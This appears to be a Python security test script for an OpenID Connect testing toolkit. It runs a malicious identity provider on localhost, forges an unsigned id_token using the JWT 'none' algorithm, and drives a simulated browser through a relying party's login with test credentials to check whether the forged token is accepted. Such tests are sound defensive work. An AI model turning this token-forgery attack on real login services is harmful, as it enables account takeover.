import sys
import os
import time
import jwt

from osbtlib import BrowserSimulator, Osbtlib

# set endpoints
ATTACKER_OP_ENDPOINT = "http://localhost:9997"
HONEST_RP_ENDPOINT = "http://localhost:9999"
PROXY_SERVER_ENDPOINT = "http://localhost:8080"
PROXY_EXTENSION_ENDPOINT = "http://localhost:5555"

# victim credentials
victim_username = 'test-user@localhost'
victim_password = 'verysecure'

# create instance of osbtlib
osbt = Osbtlib(
    proxy_extension_url = PROXY_EXTENSION_ENDPOINT
)

try:
    # create malicious id_token
    malicious_id_token = jwt.encode({"iss": "http://localhost:9997/", "aud": "hoge", "sub": "hoge"}, key="", algorithm="none")

    # send order to attacker op
    res = osbt.attacker_op.replace_id_token(malicious_id_token)
    print("request sent:", res)

    time.sleep(5)

    # define browser operations
    bs = BrowserSimulator(f'{HONEST_RP_ENDPOINT}/login', PROXY_SERVER_ENDPOINT)
    sso_flow = f"""
page.locator('input[name="username"]').fill('{victim_username}')
page.locator('input[name="password"]').fill('{victim_password}')
page.locator('button[type="submit"]').click()
    """
    # run browser operations
    bs.run(sso_flow)
    content = bs.get_content()
    print(content)
    assert("token" in content)

    osbt.attacker_op.clean()
    bs.close()

except Exception as e:
    print('Error:', e)
    osbt.proxy.clean()